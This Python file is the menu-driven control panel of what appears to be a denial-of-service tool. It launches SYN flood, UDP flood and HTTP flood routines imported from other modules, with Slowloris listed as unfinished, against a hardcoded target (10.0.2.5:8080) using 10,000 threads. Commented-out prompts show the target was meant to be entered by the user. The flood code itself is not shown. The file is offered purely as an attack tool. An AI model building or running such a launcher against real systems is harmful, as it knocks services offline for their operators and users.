from utils import *
from syn import *
from udp import *
from attackhttp import *

def control():
    RED = "\033[31m"
    RESET = "\033[0m"
    warning()

    opcao = int(input(f'''
 CONTROL PANEL ! (If you're not a {RED}superuser{RESET}
                      get out )
___________________________________________________
                                         
1 - SYN FLOOD
2 - UDP FLOOD
3 - HTTP FLOOD {RED}(Not finished yet){RESET}
4 - Slowloris Attack {RED}(Not finished yet){RESET}
___________________________________________________
                                           
Choose wisely: ''').strip())
    
    if(opcao == 1):
        clear()
        target = "10.0.2.5" #input("Target (IP or url) >> ").strip()
        port = 8080 #int(input("Target port >> "))
        num = 10000 #int(input("Number of threads >> "))
        numwor = 100 #int(input("Number of workens (default 200) >> "))
        synflood(target, port, num, numwor)

        clear()
        results(target, port, num, numwor, "SYN")
    elif(opcao == 2):
        clear()
        target = "10.0.2.5" #input("Target (IP or url) >> ").strip()
        port = 8080 #int(input("Target port >> "))
        num = 10000 #int(input("Number of threads >> "))
        numwor = 100 #int(input("Number of workens (default 200) >> "))
        udpflood(target, port, num, numwor)

        clear()
        results(target, port, num, numwor, "UDP")
    elif(opcao == 3):
        clear()
        target = "10.0.2.5" #input("Target (IP or url) >> ").strip()
        port = 8080 #int(input("Target port >> "))
        num = 10000 #int(input("Number of threads >> "))
        numwor = 100 #int(input("Number of workens (default 200) >> "))
        request_flood(target, port, num, numwor)

control()
    